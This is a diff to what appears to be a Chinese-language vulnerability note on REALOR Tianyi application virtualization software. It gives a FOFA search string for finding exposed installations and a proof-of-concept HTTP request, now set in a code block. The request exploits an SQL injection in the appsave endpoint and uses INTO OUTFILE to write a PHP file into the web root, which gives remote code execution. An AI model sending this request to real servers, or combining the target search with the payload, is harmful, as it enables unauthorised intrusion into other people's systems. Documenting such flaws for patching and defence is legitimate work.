@@ -81,8 +81,11 @@ FOFA：app="REALOR-天翼应用虚拟化系统"
 
 POC/EXP：
 
+```
 GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%27<?php echo md5("1"); $file = __FILE__; unlink($file);%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cplom.xgi%27%23 HTTP/1.1
 Host: 127.0.0.1:1234
+```
+
 
 ![image-20240508142356016](./.resource/瑞友天翼应用虚拟化系统SQL注入致远程代码执行漏洞/media/image-20240508142356016.png)
 
